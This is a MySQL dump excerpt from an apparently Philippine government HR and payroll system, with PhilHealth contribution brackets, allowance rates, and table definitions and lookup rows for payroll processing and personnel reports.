INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('33000.00', '33999.99', '33000.00', '825.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('31000.00', '31999.99', '32000.00', '800.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('1.00', '7999.99', '7000.00', '175.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('9000.00', '9999.99', '9000.00', '225.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('10000.00', '10999.99', '10000.00', '250.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('11000.00', '11999.99', '11000.00', '275.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('12000.00', '12999.99', '12000.00', '300.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('13000.00', '13999.99', '13000.00', '325.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('14000.00', '14999.99', '14000.00', '350.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('15000.00', '15999.99', '15000.00', '375.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('16000.00', '16999.99', '16000.00', '400.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('17000.00', '17999.99', '17000.00', '425.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('18000.00', '18999.99', '18000.00', '450.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('19000.00', '19999.99', '19000.99', '475.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('20000.00', '20999.99', '20000.00', '500.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('21000.00', '21999.99', '21000.00', '525.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('22000.00', '22999.99', '22000.00', '550.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('23000.00', '23999.99', '23000.00', '575.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('24000.00', '24999.99', '24000.00', '600.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('25000.00', '25999.99', '25000.00', '625.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('27000.00', '27999.99', '27000.00', '675.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('28000.00', '28999.99', '28000.00', '700.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('29000.00', '29999.99', '29000.00', '725.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('30000.00', '30999.99', '30000.00', '750.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('34000.00', '34999.99', '34000.00', '850.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('8000.00', '8999.00', '8000.00', '200.00');
INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('35000.00', '100000.00', '110000.00', '875.00');


#
# TABLE STRUCTURE FOR: tblplantilla
#

DROP TABLE IF EXISTS `tblplantilla`;

CREATE TABLE `tblplantilla` (
  `plantillaID` int(11) NOT NULL AUTO_INCREMENT,
  `itemNumber` varchar(50) NOT NULL DEFAULT '',
  `positionCode` varchar(20) NOT NULL DEFAULT '',
  `authorizeSalary` decimal(10,2) NOT NULL DEFAULT 0.00,
  `authorizeSalaryYear` decimal(15,2) NOT NULL DEFAULT 0.00,
  `salaryGrade` int(11) NOT NULL DEFAULT 0,
  `xstepNumber` int(11) NOT NULL DEFAULT 0,
  `plantillaGroupCode` varchar(20) NOT NULL DEFAULT '',
  `uniqueItemNumber` varchar(50) NOT NULL DEFAULT '',
  `plantillaItemOrder` int(11) NOT NULL DEFAULT 0,
  `payrollGroupCode` varchar(20) NOT NULL DEFAULT '',
  `agencyHead` int(11) NOT NULL DEFAULT 0,
  `rationalized` tinyint(1) NOT NULL DEFAULT 0,
  `salarySched` int(11) NOT NULL DEFAULT 0,
  `level` varchar(20) NOT NULL DEFAULT '',
  `areaCode` varchar(20) NOT NULL DEFAULT '',
  `areaType` varchar(20) NOT NULL DEFAULT '',
  `examCode` varchar(20) NOT NULL DEFAULT '',
  `examCode2` varchar(20) NOT NULL DEFAULT '',
  `educational` varchar(100) NOT NULL,
  `experience` varchar(100) NOT NULL,
  `training` varchar(100) NOT NULL,
  PRIMARY KEY (`plantillaID`),
  KEY `itemNumber` (`itemNumber`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblplantilladuties
#

DROP TABLE IF EXISTS `tblplantilladuties`;

CREATE TABLE `tblplantilladuties` (
  `itemNumber` varchar(50) NOT NULL DEFAULT '',
  `percentWork` int(11) NOT NULL DEFAULT 0,
  `itemDuties` text DEFAULT NULL,
  `dutyNumber` int(11) NOT NULL DEFAULT 0
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblplantillagroup
#

DROP TABLE IF EXISTS `tblplantillagroup`;

CREATE TABLE `tblplantillagroup` (
  `plantillaGroupCode` varchar(20) NOT NULL DEFAULT '',
  `plantillaGroupName` varchar(255) NOT NULL DEFAULT '',
  `plantillaGroupOrder` int(11) NOT NULL DEFAULT 0
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblposition
#

DROP TABLE IF EXISTS `tblposition`;

CREATE TABLE `tblposition` (
  `positionCode` varchar(20) NOT NULL DEFAULT '',
  `positionAbb` varchar(50) NOT NULL DEFAULT '',
  `positionDesc` varchar(70) NOT NULL DEFAULT '',
  `educational` varchar(100) NOT NULL DEFAULT '',
  `experience` varchar(100) NOT NULL DEFAULT '',
  `eligibility` varchar(100) NOT NULL DEFAULT '',
  `training` varchar(200) NOT NULL DEFAULT '',
  `level` varchar(5) NOT NULL DEFAULT '',
  PRIMARY KEY (`positionCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblprocess
#

DROP TABLE IF EXISTS `tblprocess`;

CREATE TABLE `tblprocess` (
  `processID` int(11) NOT NULL AUTO_INCREMENT,
  `employeeAppoint` varchar(20) NOT NULL DEFAULT '',
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin DEFAULT NULL,
  `processDate` date DEFAULT NULL,
  `processMonth` int(11) DEFAULT NULL,
  `processYear` int(11) DEFAULT NULL,
  `processCode` varchar(15) DEFAULT NULL,
  `payrollGroupCode` varchar(50) NOT NULL DEFAULT '',
  `salarySchedule` varchar(10) NOT NULL DEFAULT '',
  `period` int(11) NOT NULL DEFAULT 0,
  `publish` tinyint(1) NOT NULL DEFAULT 1,
  `custom_label` text DEFAULT NULL,
  `signatory1` int(11) NOT NULL,
  `signatory2` int(11) NOT NULL,
  PRIMARY KEY (`processID`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblprocessedemployees
#

DROP TABLE IF EXISTS `tblprocessedemployees`;

CREATE TABLE `tblprocessedemployees` (
  `processID` int(11) NOT NULL DEFAULT 0,
  `appointmentCode` varchar(20) NOT NULL DEFAULT '',
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin DEFAULT NULL,
  `surname` varchar(50) NOT NULL DEFAULT '',
  `firstname` varchar(50) NOT NULL DEFAULT '',
  `middlename` varchar(50) NOT NULL DEFAULT '',
  `middleInitial` varchar(10) NOT NULL DEFAULT '',
  `nameExtension` varchar(10) NOT NULL DEFAULT '',
  `positionAbb` varchar(50) NOT NULL DEFAULT '',
  `processDate` date DEFAULT NULL,
  `processMonth` int(11) DEFAULT NULL,
  `processYear` int(11) DEFAULT NULL,
  `processCode` varchar(15) DEFAULT NULL,
  `payrollGroupCode` varchar(50) NOT NULL DEFAULT '',
  `projectCode` varchar(20) NOT NULL DEFAULT '',
  `netPayPeriod1` decimal(10,2) NOT NULL DEFAULT 0.00,
  `netPayPeriod2` decimal(10,2) NOT NULL DEFAULT 0.00,
  `netPay` decimal(10,2) NOT NULL DEFAULT 0.00,
  `actualSalary` decimal(10,2) NOT NULL DEFAULT 0.00,
  `positionCode` varchar(20) NOT NULL DEFAULT '',
  `officeCode` varchar(20) NOT NULL DEFAULT '',
  `salarySchedule` varchar(10) NOT NULL DEFAULT '',
  `period` int(11) NOT NULL DEFAULT 0
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblprocessedpayrollgroup
#

DROP TABLE IF EXISTS `tblprocessedpayrollgroup`;

CREATE TABLE `tblprocessedpayrollgroup` (
  `processID` int(11) NOT NULL DEFAULT 0,
  `payrollGroupCode` varchar(20) NOT NULL DEFAULT '',
  `payrollGroupName` varchar(200) NOT NULL DEFAULT '',
  `projectCode` varchar(20) NOT NULL DEFAULT '',
  `payrollGroupOrder` int(11) NOT NULL DEFAULT 0
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblprocessedproject
#

DROP TABLE IF EXISTS `tblprocessedproject`;

CREATE TABLE `tblprocessedproject` (
  `processID` int(11) NOT NULL DEFAULT 0,
  `projectCode` varchar(100) NOT NULL DEFAULT '',
  `projectDesc` text NOT NULL,
  `projectOrder` int(11) NOT NULL DEFAULT 0
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblproject
#

DROP TABLE IF EXISTS `tblproject`;

CREATE TABLE `tblproject` (
  `projectCode` varchar(100) NOT NULL DEFAULT '',
  `projectDesc` text NOT NULL,
  `projectOrder` int(11) NOT NULL DEFAULT 0,
  PRIMARY KEY (`projectCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblraffle
#

DROP TABLE IF EXISTS `tblraffle`;

CREATE TABLE `tblraffle` (
  `name` text NOT NULL,
  `amount` double(15,2) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblrata
#

DROP TABLE IF EXISTS `tblrata`;

CREATE TABLE `tblrata` (
  `RATACode` char(3) NOT NULL DEFAULT '',
  `RATAAmount` decimal(10,2) NOT NULL DEFAULT 0.00,
  PRIMARY KEY (`RATACode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblrata` (`RATACode`, `RATAAmount`) VALUES ('RT1', '14000.00');
INSERT INTO `tblrata` (`RATACode`, `RATAAmount`) VALUES ('RT2', '11000.00');
INSERT INTO `tblrata` (`RATACode`, `RATAAmount`) VALUES ('RT3', '10000.00');
INSERT INTO `tblrata` (`RATACode`, `RATAAmount`) VALUES ('RT4', '9000.00');
INSERT INTO `tblrata` (`RATACode`, `RATAAmount`) VALUES ('RT5', '8500.00');
INSERT INTO `tblrata` (`RATACode`, `RATAAmount`) VALUES ('RT6', '7500.00');
INSERT INTO `tblrata` (`RATACode`, `RATAAmount`) VALUES ('RT7', '5000.00');


#
# TABLE STRUCTURE FOR: tblreports
#

DROP TABLE IF EXISTS `tblreports`;

CREATE TABLE `tblreports` (
  `reportCode` varchar(10) NOT NULL DEFAULT '',
  `reportDesc` text NOT NULL,
  `reportType` varchar(255) NOT NULL DEFAULT '',
  `reportModule` varchar(4) NOT NULL DEFAULT '',
  `reportStatus` tinyint(4) NOT NULL DEFAULT 1,
  PRIMARY KEY (`reportCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('PR', 'Payroll Register', 'Monthly', '2', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('PS', 'Pay Slip', 'Monthly', '2', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('MCBR', 'MC Benefit Register for DOST Employees', 'Monthly', '2', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('DR', 'Deduction Register for DOST Employees', 'Monthly', '2', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('FR', 'Funding Requirements', 'Monthly', '2', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('AR', 'Acceptance of Resignation', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('ARO', 'Accumulated Report By Office', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('AFLF', 'Application for Leave Form', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('ADR', 'Assumption of Duties and Responsibilities', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('DTR', 'Daily Time Record', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('CDR', 'Certificate of Duties and Responsibilities', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('PDS', 'Personal Data Sheet', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('CEC', 'Certificate of Employees Compensation', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('CNAC', 'Certificate of No Administrative Charge', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('CNACLP', 'Certificate of No Administrative Charge (for legal purposes)', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('CNACL', 'Certification of Service for Loyalty Award', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('CACQ', 'Comparative Analysis of Candidates\' Qualifications', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('LEA', 'List of Educational Attainment', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('LEAGE', 'List of Employees by Age', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('LEDH', 'List of Employees by Date Hired', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('LEDB', 'List of Employees by Date of Birth', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('LEEA', 'List of Employees by Educational Attainment', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('LEG', 'List of Employees by Gender', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('LELS', 'List of Employees by Length of Service', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('LESG', 'List of Employees by Salary Grade', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('ALC', 'Accumulated Leave Credits', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('SR', 'Service Record', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('ROT', 'Report on Tardiness', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('ROTUA', 'Report on Tardiness, Undertime and Absences', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('TOS', 'Trainings of Staff', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('LET', 'List of Employees\' Training', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('EFDS', 'Employees First Day of Service', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('EP', 'Employees Profile', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('LESGA', 'List of Employees by Salary Grade (Alphabetical)', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('LEDBA', 'List of Employees\' Date of Birth (Alphabetical)', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('LR', 'List of Retirees', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('LTP', 'List of Training Programs', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('LVP', 'List of Vacant Position(s)', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('LOYR', 'Loyalty Report', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('OB', 'Official Business Slip', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('PSK', 'Panunumpa sa Katungkulan', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('PP', 'Plantilla of Personnel', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('EAS', 'Employees Attendance Summary', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('AAR', 'Report of Attendance and Accumulated Leave Credits', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('LB', 'Leave Balance Form', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('SR67', 'Service Record (CS Form No. 67)', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('ROTUAN', 'Report on Tardiness, Undertime and Absences (Non-Permanent)', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('LELSA', 'List of Employees by Length of Service (Alphabetical)', '', '1', '1');
INSERT INTO `tblreports` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `reportStatus`) VALUES ('MA', 'Monthly Attendance', '', '1', '1');


#
# TABLE STRUCTURE FOR: tblreporttype
#

DROP TABLE IF EXISTS `tblreporttype`;

CREATE TABLE `tblreporttype` (
  `reportCode` varchar(10) NOT NULL DEFAULT '',
  `reportDesc` text NOT NULL,
  `reportType` varchar(255) NOT NULL DEFAULT '',
  `reportModule` varchar(4) NOT NULL DEFAULT '',
  `numberOfSignatory` int(11) NOT NULL DEFAULT 0,
  PRIMARY KEY (`reportCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('CEC', 'Certificate of Employees Compensation', '', '134', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('CDR', 'Certificate of Duties and Responsibilities', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('CNAC', 'Certificate of No Administrative Charge', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RPED', 'List of Employees by Educational Attainment', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('SR', 'Service Record', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('LT', 'List of Employees\' Training', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('LB', 'Leave Balance Form', '', '1', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('DTR', 'Daily Time Record', '', '134', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PS', 'xxxPay-Slip', 'xMonthly', '1234', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PR', 'Payroll Register', 'Monthly', '2', '4');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('xxxPT', 'Project Totals', 'xxxMonthly', 'xxx2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('INCM', 'Income/Allowances', 'Monthly', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RMTNC', 'Remittances (Loan/Contribution/Others)', 'Monthly', '2', '2');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('GSISPC', 'GSIS Premium Contribution', 'hold', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('GSISLR', 'GSIS Loan Remittances', 'hold', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('xxxPHR', 'PhilHealth Remittances', 'xxxMonthly', 'xxx2', '2');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PAGIBIGLR', 'PAGIBIG Loan Remittances', 'xxxMonthly', 'xxx2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('MS', 'Monthly Salary', 'Income', '2', '4');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('TA', 'Transportation Allowance', 'Income', '2', '4');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RATA', 'Representation and Transportation Allowance', 'Income', '2', '4');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PERAAC', 'Personal Economic Relief Allowance and Additional Compensation', 'Income', '2', '4');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('BCG', 'Bonus and Cash Gift', 'Yearly', '2', '4');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('SALA', 'Subsistence and Laundry Allowance', 'xxxIncome', 'xxx2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('HP', 'Hazard Pay', 'Income', '777', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('ITW', 'Income Tax Withheld', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('LR', 'Life and Retirement', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PAGIBIGP', 'PAGIBIG Premium', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('SL', 'Salary Loan', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PHP', 'PhilHealth Premium', 'Remittance', '2', '2');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('HL', 'Housing Loan', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PAGIBIGL', 'PAGIBIG Loan', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('GSISPL', 'GSIS Policy Loan', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('OULI1L', 'Optional Unlimitted Life Insurance 1 Loan', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('OULI1P', 'Optional Unlimitted Life Insurance 1 Premium', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('GSISPLP', 'GSIS Pre-need Life Premium', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PHILAMSSPP', 'PHILAM Salary Savings Plan Premium', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('LBPSL', 'Land Bank of the Philippines Salary Loan', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('DOSTCUL', 'DOST Credit Union Loan', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('DOSTEAP', 'DOST Employee Association Premium', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('GSISPEP', 'GSIS Pre-need Educational Plan', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('GSISEL', 'GSIS Emergency Loan', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('DOSTCUFFD', 'DOST Credit Union Fixed Fixed Deposit', 'Remittance', '2', '0');
